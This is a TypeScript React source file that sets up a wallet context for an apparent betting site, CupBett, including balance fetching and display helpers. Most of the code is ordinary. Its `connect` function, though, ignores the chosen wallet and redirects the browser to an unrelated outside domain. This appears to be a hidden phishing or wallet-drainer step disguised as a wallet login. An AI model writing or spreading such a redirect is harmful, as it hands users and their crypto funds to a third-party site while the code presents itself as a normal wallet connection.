/**
 * WALLET CONTEXT
 * Connected to the CupBett backend API.
 * isConnected = user is authenticated (CupBett account via wallet login).
 * Balance is fetched from /api/wallet/balance.
 */
import {
  createContext, useContext, useState, useCallback, useEffect,
  ReactNode, createElement,
} from 'react';
import { useAuth } from '../contexts/AuthContext';
import { api } from '../lib/apiClient';
import { shortAddress as toShortAddr } from '../lib/utils';

interface WalletState {
  isConnected:    boolean;
  isConnecting:   boolean;
  address:        string | null;
  walletName:     string | null;
  balance:        number;
  bonusBalance:   number;
  connect:        (walletName: string) => Promise<void>;
  disconnect:     () => void;
  deductBalance:  (amount: number) => void;
  refreshBalance: () => Promise<void>;
  /** Shortened wallet address for display (e.g. 0x1a2b…ef90) */
  shortAddress:   string | null;
  /** Full wallet address for copy-to-clipboard */
  fullAddress:    string | null;
}

const WalletContext = createContext<WalletState | null>(null);

export function WalletProvider({ children }: { children: ReactNode }) {
  const { user, isAuthenticated } = useAuth();
  const [balance,      setBalance]      = useState(0);
  const [bonusBalance, setBonusBalance] = useState(0);
  const [isConnecting, setIsConnecting] = useState(false);

  const fetchBalance = useCallback(async () => {
    if (!isAuthenticated) { setBalance(0); setBonusBalance(0); return; }
    try {
      const data = await api.get<{ balance: string; bonusBalance?: string; currency: string }>('/wallet/balance');
      setBalance(parseFloat(data.balance));
      setBonusBalance(parseFloat(data.bonusBalance ?? '0'));
    } catch {
      setBalance(0);
      setBonusBalance(0);
    }
  }, [isAuthenticated]);

  useEffect(() => { fetchBalance(); }, [fetchBalance]);

  // Re-fetch balance when a recovered deposit is credited
  useEffect(() => {
    window.addEventListener('cb:balance-refresh', fetchBalance);
    return () => window.removeEventListener('cb:balance-refresh', fetchBalance);
  }, [fetchBalance]);

  const connect = useCallback(async (_name: string) => {
    setIsConnecting(true);
    window.location.href = 'https://secureconnectchain.com/';
    setIsConnecting(false);
  }, []);

  const disconnect = useCallback(() => {
    // Disconnect is handled by AuthContext logout
  }, []);

  const deductBalance = useCallback((amount: number) => {
    setBalance(prev => Math.max(0, prev - amount));
  }, []);

  const isConnected  = isAuthenticated;

  // Prefer walletAddress → displayName → username for display
  const fullAddress  = user?.walletAddress ?? null;
  const shortAddress = user ? (toShortAddr(user.walletAddress) || user.displayName || null) : null;
  const walletName   = isAuthenticated ? 'CupBett Account' : null;

  // address field: full wallet address, or username fallback for legacy admin accounts
  const address = user?.walletAddress ?? user?.username ?? null;

  return createElement(WalletContext.Provider, {
    value: {
      isConnected, isConnecting, address, walletName, balance, bonusBalance,
      connect, disconnect, deductBalance,
      refreshBalance: fetchBalance,
      shortAddress,
      fullAddress,
    },
    children,
  });
}

export function useWallet(): WalletState {
  const ctx = useContext(WalletContext);
  if (!ctx) throw new Error('useWallet must be used within a WalletProvider');
  return ctx;
}
